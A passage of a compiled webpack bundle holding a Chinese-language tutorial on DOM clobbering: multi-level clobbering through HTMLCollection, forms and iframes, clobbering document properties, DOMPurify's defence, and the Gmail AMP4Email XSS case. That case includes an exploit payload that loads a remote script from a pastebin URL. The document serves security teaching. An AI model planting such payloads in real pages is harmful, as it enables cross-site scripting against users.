",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u4e4b\u5f8c\u53ef\u4ee5\u505a\u4ec0\u9ebc\u5462\uff1f\u5728 ",(0,a.kt)("a",{parentName:"p",href:"https://dom.spec.whatwg.org/#interface-htmlcollection"},"4.2.10.2. Interface HTMLCollection")," \u4e2d\u6709\u5beb\u5230\uff0c\u53ef\u4ee5\u5229\u7528 name \u6216\u662f id \u53bb\u62ff ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u88e1\u9762\u7684\u5143\u7d20\u3002"),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(3612).Z,width:"703",height:"256"})),(0,a.kt)("p",null,"\u50cf\u662f\u9019\u6a23\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <a id="config"></a>\n  <a id="config" name="apiUrl" href="https://huli.tw"></a>\n  <script>\n    console.log(config.apiUrl + \'\')\n    // https://huli.tw\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u5c31\u53ef\u4ee5\u900f\u904e\u540c\u540d\u7684 id \u7522\u751f\u51fa ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection"),"\uff0c\u518d\u7528 name \u4f86\u6293\u53d6 ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u7684\u7279\u5b9a\u5143\u7d20\uff0c\u4e00\u6a23\u53ef\u4ee5\u9054\u5230\u5169\u5c64\u7684\u6548\u679c\u3002"),(0,a.kt)("p",null,"\u800c\u5982\u679c\u6211\u5011\u628a ",(0,a.kt)("inlineCode",{parentName:"p"},"<form>")," \u8ddf ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u7d50\u5408\u5728\u4e00\u8d77\uff0c\u5c31\u80fd\u5920\u9054\u6210\u4e09\u5c64\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <form id="config"></form>\n  <form id="config" name="prod">\n    <input name="apiUrl" value="123" />\n  </form>\n  <script>\n    console.log(config.prod.apiUrl.value) //123\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u5148\u5229\u7528\u540c\u540d\u7684 id\uff0c\u8b93 ",(0,a.kt)("inlineCode",{parentName:"p"},"config")," \u53ef\u4ee5\u62ff\u5230 HTMLCollection\uff0c\u518d\u4f86\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"config.prod")," \u5c31\u53ef\u4ee5\u62ff\u5230 ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection")," \u4e2d name \u662f prod \u7684\u5143\u7d20\uff0c\u4e5f\u5c31\u662f\u90a3\u500b form\uff0c\u63a5\u8457\u5c31\u662f ",(0,a.kt)("inlineCode",{parentName:"p"},"form.apiUrl")," \u62ff\u5230\u8868\u55ae\u5e95\u4e0b\u7684 input\uff0c\u6700\u5f8c\u7528 value \u62ff\u5230\u88e1\u9762\u7684\u5c6c\u6027\u3002"),(0,a.kt)("p",null,"\u6240\u4ee5\u5982\u679c\u6700\u5f8c\u8981\u62ff\u7684\u5c6c\u6027\u662f HTML \u7684\u5c6c\u6027\uff0c\u5c31\u53ef\u4ee5\u56db\u5c64\uff0c\u5426\u5247\u7684\u8a71\u5c31\u53ea\u80fd\u4e09\u5c64\u3002"),(0,a.kt)("p",null,"\u4e0d\u904e\u5728 Firefox \u4e0a\u5c31\u4e0d\u592a\u4e00\u6a23\u4e86\uff0c\u5728 Firefox \u4e0a\u9762\u4e26\u4e0d\u6703\u56de\u50b3 ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection"),"\uff0c\u8209\u4f8b\u4f86\u8aaa\uff0c\u540c\u6a23\u662f\u9019\u6bb5\u7a0b\u5f0f\u78bc\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <a id="config"></a>\n  <a id="config"></a>\n  <script>\n    console.log(config) // <a id="config"></a>\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u5728 Firefox \u53ea\u6703\u8f38\u51fa\u7b2c\u4e00\u500b ",(0,a.kt)("inlineCode",{parentName:"p"},"<a>")," \u5143\u7d20\uff0c\u800c\u4e0d\u662f ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection"),"\u3002\u56e0\u6b64 Firefox \u4e26\u4e0d\u80fd\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection"),"\uff0c\u53ea\u80fd\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"<form>")," \u4ee5\u53ca\u5f85\u6703\u8981\u63d0\u5230\u7684 ",(0,a.kt)("inlineCode",{parentName:"p"},"<iframe>"),"\u3002"),(0,a.kt)("h2",{id:"\u518d\u66f4\u591a\u5c64\u7d1a\u7684-dom-clobbering"},"\u518d\u66f4\u591a\u5c64\u7d1a\u7684 DOM Clobbering"),(0,a.kt)("p",null,"\u524d\u9762\u63d0\u5230\u4e09\u5c64\u6216\u662f\u6709\u689d\u4ef6\u7684\u56db\u5c64\u5df2\u7d93\u662f\u6975\u9650\u4e86\uff0c\u90a3\u6709\u6c92\u6709\u8fa6\u6cd5\u518d\u7a81\u7834\u9650\u5236\u5462\uff1f"),(0,a.kt)("p",null,"\u6839\u64da ",(0,a.kt)("a",{parentName:"p",href:"https://portswigger.net/research/dom-clobbering-strikes-back"},"DOM Clobbering strikes back")," \u88e1\u9762\u7d66\u7684\u505a\u6cd5\uff0c\u5229\u7528 iframe \u5c31\u53ef\u4ee5\u9054\u5230\uff01"),(0,a.kt)("p",null,"\u7576\u4f60\u5efa\u4e86\u4e00\u500b iframe \u4e26\u4e14\u7d66\u5b83\u4e00\u500b name \u7684\u6642\u5019\uff0c\u7528\u9019\u500b name \u5c31\u53ef\u4ee5\u62ff\u5230 iframe \u88e1\u9762\u7684 ",(0,a.kt)("inlineCode",{parentName:"p"},"window"),"\uff0c\u6240\u4ee5\u53ef\u4ee5\u50cf\u9019\u6a23\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <iframe name="config" srcdoc=\'\n    <a id="apiUrl"></a>\n  \'></iframe>\n  <script>\n    setTimeout(() => {\n      console.log(config.apiUrl) // <a id="apiUrl"></a>\n    }, 500)\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u9019\u908a\u4e4b\u6240\u4ee5\u6703\u9700\u8981 setTimeout \u662f\u56e0\u70ba iframe \u4e26\u4e0d\u662f\u540c\u6b65\u8f09\u5165\u7684\uff0c\u6240\u4ee5\u9700\u8981\u4e00\u4e9b\u6642\u9593\u624d\u80fd\u6b63\u78ba\u6293\u5230 iframe \u88e1\u9762\u7684\u6771\u897f\u3002"),(0,a.kt)("p",null,"\u6709\u4e86 iframe \u7684\u5e6b\u52a9\u4e4b\u5f8c\uff0c\u5c31\u53ef\u4ee5\u5275\u9020\u51fa\u66f4\u591a\u5c64\u7d1a\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <iframe name="moreLevel" srcdoc=\'\n    <form id="config"></form>\n    <form id="config" name="prod">\n      <input name="apiUrl" value="123" />\n    </form>\n  \'></iframe>\n  <script>\n    setTimeout(() => {\n      console.log(moreLevel.config.prod.apiUrl.value) //123\n    }, 500)\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u5982\u679c\u4f60\u9700\u8981\u66f4\u591a\u5c64\u7d1a\u7684\u8a71\uff0c\u53ef\u4ee5\u4f7f\u7528\u9019\u500b\u597d\u7528\u7684\u5de5\u5177\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://splitline.github.io/DOM-Clobber3r/"},"DOM Clobber3r")),(0,a.kt)("h2",{id:"\u900f\u904e-document-\u64f4\u5c55\u653b\u64ca\u9762"},"\u900f\u904e document \u64f4\u5c55\u653b\u64ca\u9762"),(0,a.kt)("p",null,"\u6839\u64da\u4e0a\u9762\u6240\u5beb\u7684\uff0c\u8981\u5229\u7528 DOM clobbering \u7684\u6a5f\u6703\u5176\u5be6\u4e0d\u9ad8\uff0c\u56e0\u70ba\u7a0b\u5f0f\u78bc\u4e2d\u5fc5\u9808\u5148\u6709\u500b\u5730\u65b9\u7528\u5230\u5168\u57df\u8b8a\u6578\uff0c\u800c\u4e14\u9084\u5fc5\u9808\u6c92\u6709\u5ba3\u544a\u3002\u50cf\u9019\u7a2e\u60c5\u5883\uff0c\u5728\u958b\u767c\u7684\u6642\u5019\u65e9\u5c31\u88ab ESLint \u7d66\u627e\u51fa\u4f86\u4e86\uff0c\u600e\u9ebc\u9084\u6703\u4e0a\u7dda\uff1f"),(0,a.kt)("p",null,"\u800c DOM clobbering \u5f37\u5927\u7684\u5730\u65b9\u5c31\u5728\u65bc\u9664\u4e86 ",(0,a.kt)("inlineCode",{parentName:"p"},"window")," \u4e4b\u5916\uff0c\u6709\u5e7e\u500b\u5143\u7d20\u642d\u914d name \u4e5f\u53ef\u4ee5\u5f71\u97ff\u5230 ",(0,a.kt)("inlineCode",{parentName:"p"},"document"),"\u3002"),(0,a.kt)("p",null,"\u76f4\u63a5\u8209\u500b\u4f8b\u5b50\u4f86\u770b\u5c31\u6e05\u695a\u4e86\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n\n<html lang="en">\n<head>\n  <meta charset="utf-8">\n</head>\n<body>\n  <img name=cookie>\n  <form id=test>\n    <h1 name=lastElementChild>I am first child</h1>\n    <div>I am last child</div>\n  </form>\n  <embed name=getElementById></embed>\n  <script>\n    console.log(document.cookie) // <img name="cookie">\n    console.log(document.querySelector(\'#test\').lastElementChild) // <div>I am last child</div>\n    console.log(document.getElementById) // <embed name=getElementById></embed>\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u6211\u5011\u5229\u7528\u4e86 HTML \u5143\u7d20\u5f71\u97ff\u5230\u4e86 document\uff0c\u539f\u672c ",(0,a.kt)("inlineCode",{parentName:"p"},"document.cookie")," \u61c9\u8a72\u662f\u8981\u986f\u793a cookie \u7684\uff0c\u73fe\u5728\u537b\u8b8a\u6210\u4e86 ",(0,a.kt)("inlineCode",{parentName:"p"},"<img name=cookie>")," \u9019\u500b\u5143\u7d20\uff0c\u800c ",(0,a.kt)("inlineCode",{parentName:"p"},"lastElementChild")," \u539f\u672c\u61c9\u8a72\u8981\u56de\u50b3\u7684\u662f\u6700\u5f8c\u4e00\u500b\u5143\u7d20\uff0c\u537b\u56e0\u70ba form \u5e95\u4e0b\u7684 name \u6703\u512a\u5148\uff0c\u56e0\u6b64\u6293\u5230\u4e86\u540c\u540d\u7684\u5143\u7d20\u3002"),(0,a.kt)("p",null,"\u6700\u5f8c\u7684 ",(0,a.kt)("inlineCode",{parentName:"p"},"document.getElementById")," \u4e5f\u53ef\u4ee5\u88ab DOM \u8986\u84cb\uff0c\u5982\u6b64\u4e00\u4f86\u547c\u53eb ",(0,a.kt)("inlineCode",{parentName:"p"},"document.getElementById()")," \u6642\u5c31\u6703\u51fa\u932f\uff0c\u53ef\u4ee5\u8b93\u6574\u500b\u9801\u9762 crash\u3002"),(0,a.kt)("p",null,"\u5728 CTF \u4e2d\uff0c\u5e38\u5e38\u6703\u642d\u914d\u4e4b\u524d\u63d0\u904e\u7684 prototype pollution \u4e00\u8d77\u4f7f\u7528\uff0c\u6548\u679c\u66f4\u4f73\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="utf-8">\n</head>\n<body>\n  <img name=cookie>\n  <script>\n    // \u5148\u5047\u8a2d\u6211\u5011\u53ef\u4ee5 pollute \u6210 function\n    Object.prototype.toString = () => \'a=1\'\n    console.log(`cookie: ${document.cookie}`) // cookie: a=1\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u9019\u662f\u70ba\u4ec0\u9ebc\u5462\uff1f"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"document.cookie")," \u73fe\u5728\u662f\u4e00\u500b HTML \u5143\u7d20\uff0c\u4f7f\u7528 template \u8f38\u51fa\u6642\u5982\u679c\u5167\u5bb9\u4e0d\u662f\u5b57\u4e32\uff0c\u6703\u81ea\u52d5\u547c\u53eb ",(0,a.kt)("inlineCode",{parentName:"p"},"toString")," \u65b9\u6cd5\uff0c\u800c HTML \u5143\u7d20\u672c\u8eab\u4e26\u6c92\u6709\u5be6\u4f5c ",(0,a.kt)("inlineCode",{parentName:"p"},"toString"),"\uff0c\u6240\u4ee5\u6839\u64da\u539f\u578b\u93c8\uff0c\u6700\u5f8c\u547c\u53eb\u5230\u4e86\u6211\u5011\u6c61\u67d3\u904e\u7684 ",(0,a.kt)("inlineCode",{parentName:"p"},"Object.prototype.toString"),"\uff0c\u5c31\u56de\u50b3\u4e86\u6c61\u67d3\u904e\u5f8c\u7684\u7d50\u679c\u3002"),(0,a.kt)("p",null,"\u900f\u904e\u9019\u6a23\u7684\u6f0f\u6d1e\u4e32\u9023\uff0c\u5c31\u53ef\u4ee5\u6c61\u67d3 ",(0,a.kt)("inlineCode",{parentName:"p"},"document.cookie")," \u7684\u503c\uff0c\u9032\u800c\u5f71\u97ff\u5f8c\u7e8c\u6d41\u7a0b\u3002"),(0,a.kt)("p",null,"\u4e4b\u524d\u4ecb\u7d39\u904e\u7684 DOMPurify\uff0c\u5728\u505a sanitize \u6642\u5176\u5be6\u5c31\u6709\u7279\u5225\u8655\u7406\u9019\u4e00\u584a\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},"// https://github.com/cure53/DOMPurify/blob/d5060b309b5942fc5698070fbce83a781d31b8e9/src/purify.js#L1102\nconst _isValidAttribute = function (lcTag, lcName, value) {\n  /* Make sure attribute cannot clobber */\n  if (\n    SANITIZE_DOM &&\n    (lcName === 'id' || lcName === 'name') &&\n    (value in document || value in formElement)\n  ) {\n    return false;\n  }\n  // ...\n}\n")),(0,a.kt)("p",null,"\u5982\u679c id \u6216\u662f name \u7684\u503c\u5df2\u7d93\u5b58\u5728\u65bc ",(0,a.kt)("inlineCode",{parentName:"p"},"document")," \u6216\u662f ",(0,a.kt)("inlineCode",{parentName:"p"},"formElement")," \u4e4b\u4e2d\u5c31\u8df3\u904e\uff0c\u963b\u6b62\u4e86\u91dd\u5c0d document \u8ddf form \u7684 DOM clobbering\u3002"),(0,a.kt)("p",null,"\u81f3\u65bc\u4e4b\u524d\u4e5f\u4ecb\u7d39\u904e\u7684 Sanitizer API\uff0c\u5728",(0,a.kt)("a",{parentName:"p",href:"https://wicg.github.io/sanitizer-api/#dom-clobbering"},"\u898f\u683c"),"\u88e1\u9762\u5247\u662f\u5f88\u660e\u78ba\u5730\u5beb\u8aaa\uff1a\u300cThe Sanitizer API does not protect DOM clobbering attacks in its default state\u300d\uff0c\u662f\u4e0d\u6703\u5e6b\u4f60\u505a\u9632\u8b77\u7684\u3002"),(0,a.kt)("h2",{id:"\u5be6\u969b\u6848\u4f8b\u7814\u7a76gmail-amp4email-xss"},"\u5be6\u969b\u6848\u4f8b\u7814\u7a76\uff1aGmail AMP4Email XSS"),(0,a.kt)("p",null,"\u5728 2019 \u5e74\u7684\u6642\u5019 Gmail \u6709\u4e00\u500b\u6f0f\u6d1e\u5c31\u662f\u900f\u904e DOM clobbering \u4f86\u653b\u64ca\u7684\uff0c\u5b8c\u6574\u7684 write up \u5728\u9019\u908a\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://research.securitum.com/xss-in-amp4email-dom-clobbering/"},"XSS in GMail\u2019s AMP4Email via DOM Clobbering"),"\uff0c\u5e95\u4e0b\u6211\u5c31\u7a0d\u5fae\u8b1b\u4e00\u4e0b\u904e\u7a0b\uff08\u5167\u5bb9\u90fd\u53d6\u6750\u81ea\u4e0a\u9762\u9019\u7bc7\u6587\u7ae0\uff09\u3002"),(0,a.kt)("p",null,"\u7c21\u55ae\u4f86\u8aaa\u5462\uff0c\u5728 Gmail \u88e1\u9762\u4f60\u53ef\u4ee5\u4f7f\u7528\u90e8\u5206 AMP \u7684\u529f\u80fd\uff0c\u7136\u5f8c Google \u91dd\u5c0d\u9019\u500b\u683c\u5f0f\u7684 validator \u5f88\u56b4\u8b39\uff0c\u6240\u4ee5\u6c92\u6709\u8fa6\u6cd5\u900f\u904e\u4e00\u822c\u7684\u65b9\u6cd5 XSS\u3002"),(0,a.kt)("p",null,"\u4f46\u662f\u6709\u4eba\u767c\u73fe\u53ef\u4ee5\u5728 HTML \u5143\u7d20\u4e0a\u9762\u8a2d\u7f6e id\uff0c\u53c8\u767c\u73fe\u7576\u4ed6\u8a2d\u7f6e\u4e86\u4e00\u500b ",(0,a.kt)("inlineCode",{parentName:"p"},'<a id="AMP_MODE">')," \u4e4b\u5f8c\uff0cconsole \u7a81\u7136\u51fa\u73fe\u4e00\u500b\u8f09\u5165 script \u7684\u932f\u8aa4\uff0c\u800c\u4e14\u7db2\u5740\u4e2d\u7684\u5176\u4e2d\u4e00\u6bb5\u662f ",(0,a.kt)("inlineCode",{parentName:"p"},"undefined"),"\u3002\u4ed4\u7d30\u53bb\u7814\u7a76\u7a0b\u5f0f\u78bc\u4e4b\u5f8c\uff0c\u6709\u4e00\u6bb5\u7a0b\u5f0f\u78bc\u5927\u6982\u662f\u9019\u6a23\u7684\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},'var script = window.document.createElement("script");\nscript.async = false;\n\nvar loc;\nif (AMP_MODE.test && window.testLocation) {\n    loc = window.testLocation\n} else {\n    loc = window.location;\n}\n\nif (AMP_MODE.localDev) {\n    loc = loc.protocol + "//" + loc.host + "/dist"\n} else {\n    loc = "https://cdn.ampproject.org";\n}\n\nvar singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";\nb.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";\n\ndocument.head.appendChild(b);\n')),(0,a.kt)("p",null,"\u5982\u679c\u6211\u5011\u80fd\u8b93 ",(0,a.kt)("inlineCode",{parentName:"p"},"AMP_MODE.test")," \u8ddf ",(0,a.kt)("inlineCode",{parentName:"p"},"AMP_MODE.localDev")," \u90fd\u662f truthy \u7684\u8a71\uff0c\u518d\u642d\u914d\u8a2d\u7f6e ",(0,a.kt)("inlineCode",{parentName:"p"},"window.testLocation"),"\uff0c\u5c31\u80fd\u5920\u8f09\u5165\u4efb\u610f\u7684 script\uff01"),(0,a.kt)("p",null,"\u6240\u4ee5 exploit \u6703\u9577\u7684\u50cf\u9019\u6a23\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'// \u8b93 AMP_MODE.test \u8ddf AMP_MODE.localDev \u6709\u6771\u897f\n<a id="AMP_MODE" name="localDev"></a>\n<a id="AMP_MODE" name="test"></a>\n\n// \u8a2d\u7f6e testLocation.protocol\n<a id="testLocation"></a>\n<a id="testLocation" name="protocol" \n   href="https://pastebin.com/raw/0tn8z0rG#"></a>\n')),(0,a.kt)("p",null,"\u6700\u5f8c\u5c31\u80fd\u6210\u529f\u8f09\u5165\u4efb\u610f script\uff0c\u9032\u800c\u9054\u6210 XSS\uff01\uff08\u4e0d\u904e\u7576\u521d\u4f5c\u8005\u53ea\u6709\u8a66\u5230\u9019\u4e00\u6b65\u5c31\u88ab CSP \u64cb\u4f4f\u4e86\uff0c\u53ef\u898b CSP \u9084\u662f\u5f88\u6709\u7528\u7684\uff09\u3002"),(0,a.kt)("p",null,"\u9019\u61c9\u8a72\u662f DOM Clobbering \u6700\u6709\u540d\u7684\u6848\u4f8b\u4e4b\u4e00\u4e86\uff0c\u800c\u767c\u73fe\u9019\u500b\u6f0f\u6d1e\u7684\u7814\u7a76\u54e1\u5c31\u662f\u4e4b\u524d\u5728\u8b1b Mutation XSS \u4ee5\u53ca Kibana \u6642\u90fd\u63d0\u904e\u7684 Micha\u0142 Bentkowski\uff0c\u4e00\u500b\u4eba\u5c31\u5275\u9020\u4e86\u8a31\u591a\u7d93\u5178\u6848\u4f8b\u3002"),(0,a.kt)("h2",{id:"\u5c0f\u7d50"},"\u5c0f\u7d50"),(0,a.kt)("p",null,"\u96d6\u7136\u8aaa DOM Clobbering \u7684\u4f7f\u7528\u5834\u5408\u6709\u9650\uff0c\u4f46\u771f\u7684\u662f\u500b\u76f8\u7576\u6709\u8da3\u7684\u653b\u64ca\u65b9\u5f0f\uff01\u800c\u4e14\u5982\u679c\u4f60\u4e0d\u77e5\u9053\u9019\u500b feature \u7684\u8a71\uff0c\u53ef\u80fd\u5b8c\u5168\u6c92\u60f3\u904e\u53ef\u4ee5\u900f\u904e HTML \u4f86\u5f71\u97ff\u5168\u57df\u8b8a\u6578\u7684\u5167\u5bb9\u3002"),(0,a.kt)("p",null,"\u5982\u679c\u5c0d\u9019\u500b\u653b\u64ca\u624b\u6cd5\u6709\u8208\u8da3\u7684\uff0c\u53ef\u4ee5\u53c3\u8003 PortSwigger \u7684",(0,a.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/dom-based/dom-clobbering"},"\u6587\u7ae0"),"\uff0c\u88e1\u9762\u63d0\u4f9b\u4e86\u5169\u500b lab \u8b93\u5927\u5bb6\u89aa\u81ea\u5617\u8a66\u9019\u500b\u653b\u64ca\u624b\u6cd5\uff0c\u5149\u770b\u662f\u6c92\u7528\u7684\uff0c\u8981\u5be6\u969b\u4e0b\u53bb\u653b\u64ca\u624d\u66f4\u80fd\u9ad4\u6703\u3002"),(0,a.kt)("p",null,"\u53c3\u8003\u8cc7\u6599\uff1a"),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"http://blog.zeddyu.info/2020/03/04/Dom-Clobbering/#HTML-Relationships"},"\u4f7f\u7528 Dom Clobbering \u6269\u5c55 XSS")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://portswigger.net/research/dom-clobbering-strikes-back"},"DOM Clobbering strikes back")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},"DOM Clobbering Attack\u5b66\u4e60\u8bb0\u5f55.md")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://ljdd520.github.io/2020/03/14/DOM-Clobbering%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},"DOM Clobbering\u5b66\u4e60\u8bb0\u5f55")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://research.securitum.com/xss-in-amp4email-dom-clobbering/"},"XSS in GMail\u2019s AMP4Email via DOM Clobbering")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://stackoverflow.com/questions/6381425/is-there-a-spec-that-the-id-of-elements-should-be-made-global-variable"},"Is there a spec that the id of elements should be made global variable?")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://stackoverflow.com/questions/25325221/why-dont-we-just-use-element-ids-as-identifiers-in-javascript"},"Why don't we just use element IDs as identifiers in JavaScript?")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://stackoverflow.com/questions/3434278/do-dom-tree-elements-with-ids-become-global-variables"},"Do DOM tree elements with ids become global variables?"))))}s.isMDXComponent=!0},3728:(e,n,t)=>{t.d(n,{Z:()=>l});const l=t.p+"assets/images/15-01-9d0ae7b83eca58a9e10cfe0543268273.png"},9274:(e,n,t)=>{t.d(n,{Z:()=>l});const l=t.p+"assets/images/15-02-57de123e33ca887fbee29b26f822617d.png"},6373:(e,n,t)=>{t.d(n,{Z:()=>l});const l=t.p+"assets/images/15-03-22deb60dd4591e032f7672becb75b144.png"},7331:(e,n,t)=>{t.d(n,{Z:()=>l});const l=t.p+"assets/images/15-04-8394bad6263cb93221d8a88c9de49769.png"},3612:(e,n,t)=>{t.d(n,{Z:()=>l});const l=t.p+"assets/images/15-05-5e028fd5d013ef7e39f4cb344bc5068f.png"}}]);